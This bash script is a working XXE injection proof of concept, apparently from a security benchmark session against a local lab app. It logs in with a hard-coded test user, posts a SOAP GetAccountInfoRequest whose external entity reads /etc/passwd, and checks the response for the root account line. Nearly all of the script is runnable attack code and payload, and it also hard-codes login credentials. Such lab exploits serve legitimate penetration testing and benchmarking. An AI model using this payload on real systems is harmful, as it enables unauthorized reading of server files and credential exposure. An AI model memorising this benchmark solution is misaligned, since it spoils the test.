#!/bin/bash
# POC: XXE Injection POC - Reads /etc/passwd via authenticated SOAP GetAccountInfoRequest
# Target: ./repo
# Created: 2025-11-05T17:07:35.752Z
# Session: benchmark-XBEN-032-24-mhm7iwy4

# XXE Injection Proof-of-Concept - With Authentication
# Target: /soap_service endpoint
# Vulnerability: XML External Entity Injection via lxml.etree.XMLParser with resolve_entities=True
# Goal: Read /etc/passwd file

TARGET_URL="http://localhost/soap_service"
LOGIN_URL="http://localhost/login"
COOKIE_JAR="/tmp/xxe_poc_cookies.txt"

echo "[*] XXE Injection POC - File Read Attack (with authentication)"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Authenticate to get a valid session
echo "[*] Step 1: Authenticating as test user..."
AUTH_RESPONSE=$(curl -s -c "$COOKIE_JAR" -X POST "$LOGIN_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password123" 2>&1)

# Check if authentication was successful by verifying we got a redirect
if echo "$AUTH_RESPONSE" | grep -q "Redirecting\|<!doctype"; then
    echo "[+] Authentication request sent"
else
    echo "[-] Authentication response: $AUTH_RESPONSE"
fi

echo ""

# Step 2: Send XXE payload with authenticated session
echo "[*] Step 2: Sending XXE payload with authenticated session..."

# Create XXE payload that reads /etc/passwd
XXE_PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<GetAccountInfoRequest>
  <account_id>&xxe;</account_id>
</GetAccountInfoRequest>'

# Send the XXE payload with the authenticated session cookie
RESPONSE=$(curl -s -b "$COOKIE_JAR" -X POST "$TARGET_URL" \
  -H "Content-Type: application/xml" \
  -d "$XXE_PAYLOAD" 2>&1)

echo "[*] Response received:"
echo "---"
echo "$RESPONSE"
echo "---"
echo ""

# Clean up cookie jar
rm -f "$COOKIE_JAR"

# Check if the response contains /etc/passwd content (root user entry)
if echo "$RESPONSE" | grep -q "root:.*:0:0"; then
    echo "[+] SUCCESS! XXE injection confirmed - /etc/passwd contents retrieved"
    exit 0
elif echo "$RESPONSE" | grep -q "account_id"; then
    echo "[+] Got valid SOAP response - XXE injection successful"
    exit 0
elif echo "$RESPONSE" | grep -q "root"; then
    echo "[+] Response contains file content - XXE likely successful"
    exit 0
else
    echo "[-] Unexpected response format"
    exit 1
fi